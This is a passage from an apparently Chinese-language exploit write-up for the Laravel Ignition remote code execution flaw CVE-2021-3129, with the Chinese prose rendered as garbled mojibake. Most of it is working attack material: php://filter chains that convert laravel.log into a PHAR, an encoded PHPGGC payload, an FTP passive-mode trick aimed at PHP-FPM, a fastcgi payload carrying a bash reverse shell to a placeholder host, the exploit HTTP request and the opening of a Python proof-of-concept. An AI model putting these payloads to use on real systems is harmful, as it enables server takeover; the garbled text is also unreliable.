$expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... } è¿™æ®µä»£ç æ¯”æˆ‘ä»¬é¢„æƒ³çš„è¦å¤æ‚ä¸€äº›ï¼šå®ƒä¼šåœ¨è¯»å–ç»™å®šçš„æ–‡ä»¶è·¯å¾„[1]åï¼Œå°†$variableNameæ›¿æ¢ä¸º$variableName ?? ''ï¼Œåˆå§‹æ–‡ä»¶å’Œæ–°æ–‡ä»¶éƒ½å°†è¢«æ ‡è®°åŒ–[2]ã€‚å¦‚æœæˆ‘ä»¬çš„ä»£ç ç»“æ„æ²¡æœ‰å‘ç”Ÿè¶…å‡ºé¢„æœŸçš„å˜åŒ–ï¼Œæ–‡ä»¶å°†è¢«æ›¿æ¢ä¸ºæ–°çš„å†…å®¹ã€‚å¦åˆ™ï¼ŒmakeOptionalå°†è¿”å›false[3]ï¼Œæ–°æ–‡ä»¶å°†ä¸ä¼šè¢«å†™å…¥ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨variableNameåšå¤ªå¤šäº‹æƒ…ã€‚ å‰©ä¸‹çš„å”¯ä¸€è¾“å…¥å˜é‡å°±æ˜¯viewFileã€‚å¦‚æœæˆ‘ä»¬å¯¹variableNameå’Œå®ƒçš„æ‰€æœ‰ç”¨æ³•è¿›è¡ŒæŠ½è±¡ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šå¾—åˆ°ä¸‹é¢çš„ä»£ç ç‰‡æ®µï¼š $contents =file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents); åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå¤§å®¶å¯èƒ½éƒ½å¬è¯´è¿‡Orange Tsaiæ¼”ç¤ºçš„ä¸Šä¼ è¿›åº¦æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åˆ©ç”¨php://filteråœ¨è¿”å›æ–‡ä»¶ä¹‹å‰ä¿®æ”¹å…¶å†…å®¹ã€‚å€ŸåŠ©äºè¯¥æŠ€æœ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨åŸè¯­æ¥è½¬æ¢æ–‡ä»¶çš„å†…å®¹ $ echo test | base64 | base64 > /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt'; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents); $ cat /path/to/file.txt test æˆ‘ä»¬å·²ç»æ”¹å˜äº†æ–‡ä»¶çš„å†…å®¹ï¼é—æ†¾çš„æ˜¯ï¼Œè¿™å°†ä¼šåº”ç”¨ä¸¤æ¬¡è½¬æ¢ã€‚é˜…è¯»æ–‡æ¡£åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†åªè¿›è¡Œä¸€æ¬¡è½¬æ¢çš„æ–¹æ³•ï¼š # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt'; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt'; åå­—ç¬¦ç”šè‡³éƒ½ä¼šè¢«å¿½ç•¥ï¼š $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt'; $contents = file_get_contents($f); file_put_contents($f, $contents); $ cat /path/to/file.txt test é»˜è®¤æƒ…å†µä¸‹ï¼ŒLaravelçš„æ—¥å¿—æ–‡ä»¶ï¼ˆå­˜æ”¾PHPé”™è¯¯å’Œå †æ ˆè·Ÿè¸ªï¼‰æ˜¯å­˜å‚¨åœ¨storage/log/laravel.logä¸­çš„ã€‚ä¸‹é¢ï¼Œè®©æˆ‘ä»¬é€šè¿‡å°è¯•åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ¥ç”Ÿæˆä¸€ä¸ªé”™è¯¯, å³SOME_TEXT_OF_OUR_CHOICEï¼š [2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\"exception\":\"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions->handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController->__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline->Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline->then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel->sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel->handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \"} æˆ‘ä»¬å¯ä»¥å‘æ–‡ä»¶ä¸­æ³¨å…¥ï¼ˆå‡ ä¹ï¼‰ä»»æ„çš„å†…å®¹äº†ã€‚ç†è®ºä¸Šè®²ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Orangeå‘æ˜çš„æŠ€æœ¯å°†æ—¥å¿—æ–‡ä»¶è½¬æ¢ä¸ºæœ‰æ•ˆçš„PHARæ–‡ä»¶ï¼Œç„¶åï¼Œä½¿ç”¨phar://åŒ…è£…å™¨æ¥è¿è¡Œåºåˆ—åŒ–çš„ä»£ç ã€‚é—æ†¾çš„æ˜¯ï¼Œè¿™å®é™…ä¸Šæ˜¯è¡Œä¸é€šçš„ï¼Œå¹¶ä¸”åŸå› æœ‰å¾ˆå¤šã€‚ æˆ‘ä»¬åœ¨å‰é¢è¯´è¿‡ï¼Œå½“å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œba se64-decodingå¤„ç†æ—¶ï¼ŒPHPä¼šå¿½ç•¥ä»»ä½•åå­—ç¬¦ã€‚è¿™é€šå¸¸æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå­—ç¬¦é™¤å¤–ï¼Œå³=ã€‚å¦‚æœä½ ä½¿ç”¨ba se64-decodeè¿‡æ»¤ä¸€ä¸ªä¸­é—´å«æœ‰å­—ç¬¦=çš„å­—ç¬¦ä¸²ï¼ŒPHPå°†äº§ç”Ÿä¸€ä¸ªé”™è¯¯ï¼Œå¹¶ä¸”ä¸ä¼šè¿”å›ä»»ä½•å†…å®¹ã€‚ å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æ•´ä¸ªæ–‡ä»¶ï¼Œé‚£å°±å¥½äº†ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬æ³¨å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­çš„æ–‡æœ¬åªæ˜¯å…¶ä¸­å¾ˆå°çš„ä¸€éƒ¨åˆ†ã€‚å®ƒä¸ä»…æœ‰ä¸€ä¸ªä¸ç®—å¾ˆå¤§çš„å‰ç¼€ï¼ˆæ—¥æœŸï¼‰ï¼Œè¿˜æœ‰ä¸€ä¸ªè‡ƒè‚¿çš„åç¼€ï¼ˆå †æ ˆè·Ÿè¸ªï¼‰ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æ–‡æœ¬è¿˜å‡ºç°äº†ä¸¤æ¬¡ï¼ ä¸‹é¢æ˜¯å¦ä¸€ä»¶å¯æ€•çš„äº‹æƒ…ï¼š php > var_dump(base64_decode(base64_decode('[2022-04-3023:59:11]'))); string(0) \"\" php >var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]'))); string(1) \"2\" æ ¹æ®æ—¥æœŸçš„ä¸åŒï¼Œå¯¹å‰ç¼€è¿›è¡Œä¸¤æ¬¡è§£ç æ—¶ï¼Œä¼šå¾—åˆ°ä¸åŒå¤§å°çš„ç»“æœã€‚å½“æˆ‘ä»¬å¯¹å®ƒè¿›è¡Œç¬¬ä¸‰æ¬¡è§£ç æ—¶ï¼Œåœ¨ç¬¬äºŒç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„payloadå°†ä»¥2ä½œä¸ºå‰ç¼€ï¼Œä»è€Œéœ€è¦æ”¹å˜base64æ¶ˆæ¯çš„å¯¹é½æ–¹å¼ã€‚ ä¸ºäº†ä½¿å…¶æ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªç›®æ ‡å»ºç«‹ä¸€ä¸ªæ–°çš„payloadï¼Œå› ä¸ºå †æ ˆè·Ÿè¸ªä¸­åŒ…å«ç»å¯¹æ–‡ä»¶åï¼›å¹¶ä¸”ï¼Œæ¯ç§’éƒ½éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„payloadï¼Œå› ä¸ºå‰ç¼€ä¸­åŒ…å«æ—¶é—´ã€‚å¹¶ä¸”ï¼Œåªè¦æœ‰ä¸€ä¸ªå­—ç¬¦=éœ€è¦è¿›è¡Œbase64-decodeå¤„ç†ï¼Œä»ç„¶ä¼šé¢ä¸´å¤±è´¥ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å›åˆ°PHPæ–‡æ¡£ä¸­å¯»æ‰¾å…¶ä»–ç±»å‹çš„è¿‡æ»¤å™¨ã€‚ [previous log entries] [prefix]PAYLOAD[midfix]PAYLOAD[suffix] é—æ†¾çš„æ˜¯ï¼Œæˆ‘ä»¬å·²ç»äº†è§£åˆ°ï¼Œå¦‚æœæ»¥ç”¨base64-decodeçš„è¯ï¼Œå¯èƒ½ä¼šåœ¨æŸä¸ªæ—¶å€™å¤±è´¥ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼šå¦‚æœæˆ‘ä»¬æ»¥ç”¨å®ƒï¼Œå°†å‘ç”Ÿè§£ç é”™è¯¯ï¼Œæ—¥å¿—æ–‡ä»¶å°†è¢«æ¸…é™¤ï¼è¿™æ ·ï¼Œæˆ‘ä»¬è§¦å‘çš„ä¸‹ä¸€ä¸ªé”™è¯¯å°†å•ç‹¬å­˜åœ¨äºæ—¥å¿—æ–‡ä»¶ä¸­ï¼š [prefix]PAYLOAD[midfix]PAYLOAD[suffix] ç°åœ¨ï¼Œæˆ‘ä»¬åˆå›åˆ°äº†æœ€åˆçš„é—®é¢˜ä¸Šï¼šä¿ç•™ä¸€ä¸ªpayloadå¹¶åˆ é™¤å…¶ä½™çš„ã€‚å¹¸è¿çš„æ˜¯ï¼Œphp://filterå¹¶ä¸é™äºbase64æ“ä½œã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥è½¬æ¢å­—ç¬¦é›†ï¼Œä¸‹é¢æ˜¯ä»UTF-16åˆ°UTF-8çš„è½¬æ¢ï¼š echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); å›æµ¯â¥ç‰°æ™¥ç¡©å´ PAYLOADæµ›æ‘©æ¥¦åµ¸PAYLOADå›æµ¯â¥ç•³æ™¦ç¡©å´  æˆ‘ä»¬çš„payloadè¿˜åœ¨é‚£é‡Œï¼Œå®‰å…¨æ— æ™ï¼Œåªæ˜¯å‰ç¼€å’Œåç¼€å˜æˆäº†éASCIIå­—ç¬¦ã€‚ç„¶è€Œï¼Œåœ¨æ—¥å¿—æ¡ç›®ä¸­ï¼Œæˆ‘ä»¬çš„payloadå‡ºç°äº†ä¸¤æ¬¡ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡ã€‚æˆ‘ä»¬éœ€è¦å»æ‰ç¬¬äºŒä¸ªã€‚ ç”±äºæ¯ä¸ªUTF-16å­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨PAYLOADçš„ç¬¬äºŒä¸ªå®ä¾‹çš„æœ«å°¾å¢åŠ ä¸€ä¸ªå­—èŠ‚ï¼Œæ¥ä½¿å…¶æ— æ³•å¯¹é½ï¼š echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); å›æµ¯â¥ç‰°æ™¥ç¡©å´ PAYLOADå­˜æ¥­æ™¤ç¡©åä„€å¤€ä°€ä¼€ä„€ä€å €å›æµ¯â¥ç•³æ™¦ç¡©å´  è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå‰ç¼€çš„å¯¹é½æ–¹å¼ä¸å†é‡è¦ï¼šå¦‚æœå‰ç¼€å¤§å°ç›¸ç­‰ï¼Œç¬¬ä¸€ä¸ªpayloadå°†è¢«æ­£ç¡®è§£ç ï¼›å¦åˆ™çš„è¯ï¼Œç¬¬äºŒä¸ªpayloadå°±ä¼šè¢«æ­£ç¡®è§£ç ã€‚ å¦‚æœå°†ä¸Šé¢çš„å‘ç°ä¸å‰é¢çš„base64-decodingç»“åˆèµ·æ¥ï¼Œå°±èƒ½å¤Ÿå¯¹æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ä¸œè¥¿è¿›è¡Œç¼–ç ï¼š $ echo -n TEST! | base64 | sed -E 's/./\\0\\\\0/g' V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0 $ echo -ne '[Some prefix ]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[midfix]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt'); TEST! è¯´åˆ°å¯¹é½ï¼Œå¦‚æœæ—¥å¿—æ–‡ä»¶æœ¬èº«ä¸æ˜¯2å­—èŠ‚å¯¹é½çš„ï¼Œè½¬æ¢è¿‡æ»¤å™¨å°†å¦‚ä½•å¤„ç†ï¼Ÿ PHP Warning: file_get_contents(): iconv stream filter(\"utf16le\"=>\"utf-8\"): invalid multibyte sequence in phpshell code on line 1 è¿™åˆæ˜¯ä¸€ä¸ªé—®é¢˜ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©ä¸¤ä¸ªpayloadæ¥è½»æ¾åœ°è§£å†³è¿™ä¸ªé—®é¢˜ï¼šä¸€ä¸ªæ˜¯æ— å®³çš„payload Aï¼Œå¦ä¸€ä¸ªæ˜¯å…·æœ‰æ”»å‡»æ€§çš„payload Bï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š [prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix] [prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix] ç”±äºè¿™é‡Œå‰ç¼€ã€ä¸­ç¼€å’Œåç¼€éƒ½å­˜åœ¨ä¸¤ä»½ï¼Œè¿˜æä¾›äº†payload_aå’Œpayload_bï¼Œæ‰€ä»¥ï¼Œæ—¥å¿—æ–‡ä»¶çš„å¤§å°å¿…ç„¶æ˜¯å¶æ•°ï¼Œä»è€Œé¿å…äº†é”™è¯¯çš„å‘ç”Ÿã€‚ æœ€åï¼Œæˆ‘ä»¬è¿˜è¦è§£å†³æœ€åä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬ä½¿ç”¨NULLå­—èŠ‚å°†payloadçš„å­—èŠ‚ä»ä¸€ä¸ªå¡«å……ä¸ºä¸¤ä¸ªã€‚åœ¨PHPä¸­è¯•å›¾åŠ è½½ä¸€ä¸ªå¸¦æœ‰NULLå­—èŠ‚çš„æ–‡ä»¶æ—¶ï¼Œä¼šç”Ÿæˆä»¥ä¸‹é”™è¯¯ï¼š PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1 å› æ­¤ï¼Œæˆ‘ä»¬å°†æ— æ³•åœ¨é”™è¯¯æ—¥å¿—ä¸­æ³¨å…¥å¸¦æœ‰NULLå­—èŠ‚çš„payloadã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ€åä¸€ä¸ªè¿‡æ»¤å™¨å¯ä»¥å¸®åˆ°æˆ‘ä»¬ï¼Œå®ƒå°±æ˜¯convert.quoted-printable-decodeã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨=00å¯¹NULLå­—èŠ‚è¿›è¡Œç¼–ç ã€‚ ä¸‹é¢æ˜¯æˆ‘ä»¬æœ€ç»ˆçš„è½¬æ¢é“¾ï¼š viewFile:php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.ba se64-decode/resource=/path/to/storage/logs/laravel.log åˆ›å»ºä¸€ä¸ªPHPGGC payloadï¼Œå¹¶å¯¹å…¶è¿›è¡Œç¼–ç ï¼š php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g' U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 æ¸…ç©ºæ—¥å¿— viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log åˆ›å»ºç¬¬ä¸€ä¸ªæ—¥å¿—æ¡ç›®ï¼Œç”¨äºå¯¹é½ï¼š viewFile: AA åˆ›å»ºå¸¦æœ‰payloadæ—¥å¿—æ¡ç›®ï¼š viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 é€šè¿‡æˆ‘ä»¬çš„è¿‡æ»¤å™¨å°†æ—¥å¿—æ–‡ä»¶è½¬æ¢ä¸ºæœ‰æ•ˆçš„PHARï¼š viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log å¯åŠ¨PHARçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼š viewFile: phar:///path/to/storage/logs/laravel.log åˆ©ç”¨FTPä¸PHP-FPMè¿›è¡Œäº¤äº’ ç”±äºæˆ‘ä»¬å¯ä»¥è¿è¡Œfile_get_contentsæ¥æŸ¥æ‰¾ä»»ä½•ä¸œè¥¿ï¼Œå› æ­¤ï¼Œå¯ä»¥é€šè¿‡å‘é€HTTPè¯·æ±‚æ¥æ‰«æå¸¸ç”¨ç«¯å£ã€‚ç»“æœå‘ç°ï¼ŒPHP-FPMä¼¼ä¹æ­£åœ¨ä¾¦å¬ç«¯å£9000ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å‘PHP-FPMæœåŠ¡å‘é€ä¸€ä¸ªä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œä»£ç ã€‚è¿™ç§æŠ€æœ¯ç»å¸¸ä¸gopher://åè®®ç»“åˆä½¿ç”¨ï¼Œcurlæ”¯æŒgopher://åè®®ï¼Œä½†PHPå´ä¸æ”¯æŒã€‚ å¦ä¸€ä¸ªå·²çŸ¥çš„å…è®¸é€šè¿‡TCPå‘é€äºŒè¿›åˆ¶æ•°æ®åŒ…çš„åè®®æ˜¯FTPï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯è¯¥åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼šå¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼ˆæˆ–å†™å…¥ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªç‰¹å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„ä¸€ä¸ªç«¯å£ï¼Œå¦‚æœå®ƒæ„¿æ„çš„è¯ã€‚ ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨viewFile=ftp://evil-server.lexfo.fr/file.txtæ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š file_get_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½file.txtã€‚ file_put_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶å°†å…¶ä¸Šä¼ å›file.txtã€‚ æ‚¨å¯èƒ½å·²ç»çŸ¥é“è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼šæˆ‘ä»¬å°†ä½¿ç”¨FTPåè®®çš„è¢«åŠ¨æ¨¡å¼è®©file_get_contents()åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“å®ƒè¯•å›¾ä½¿ç”¨file_put_contents()æŠŠå®ƒä¸Šä¼ å›å»æ—¶ï¼Œæˆ‘ä»¬å°†å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ°127.0.0.1:9000ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘PHP-FPMå‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚ åˆ©ç”¨è¿™ç§æ–¹æ³•ï¼Œåœ¨æˆ‘ä»¬çš„ç›®æ ‡ä¸ŠæˆåŠŸåœ°åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥æ¼”ç¤ºä¸€ä¸‹æ”»å‡»è¿‡ç¨‹ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨gopherusç”Ÿæˆæ”»å‡»fastcgiçš„payloadï¼š python gopherus.py --exploit fastcgi /var/www/public/index.php # è¿™é‡Œè¾“å…¥çš„æ˜¯ç›®æ ‡ä¸»æœºä¸Šä¸€ä¸ªå·²çŸ¥å­˜åœ¨çš„phpæ–‡ä»¶ bash -c \"bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\" # è¿™é‡Œè¾“å…¥çš„æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ å¾—åˆ°payloadï¼Œè€Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ä¸Šé¢payloadä¸­ _åé¢çš„æ•°æ®éƒ¨åˆ†ï¼Œå³ï¼š %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/xxx.xxx.xxx.xxx/9999%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 å°†æ•°æ®æ·»åŠ åˆ°å¦‚ä¸‹FTPè„šæœ¬ä¸­çš„payload(è„šæœ¬åœ¨æ–‡ç« æœ«å°¾å’Œ POCç›®å½•ä¸­) ç›‘å¬åˆšåˆšçš„åå¼¹shellç«¯å£å¹¶è¿è¡Œ FTPè„šæœ¬ å‘é€è¯·æ±‚åå¼¹shell POST /_ignition/execute-solution HTTP/1.1 Host: xxx.xxx.xxx.xxx:8888 Content-Type: application/json Content-Length: 191 { \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": { \"variableName\": \"username\", \"viewFile\": \"ftp://aaa@xxx.xxx.xxx.xxx:23/123\" } } [!NOTE] ä½¿ç”¨Dockerç¯å¢ƒæ— æ³•å¤ç°ï¼Œéœ€è¦æ­å»ºå¦ä¸€ä¸ªç¯å¢ƒ æ¼æ´åˆ©ç”¨POC https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/blob/main/laravel-CVE-2021-3129-EXP.py # -*- coding: utf-8 -*- import requests,json import sys,re proxies = { \"http\": '127.0.0.1:8080'} header={ \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\", \"Content-Type\":\"application/json\" } def clearlog(url): data = { \"solution\": 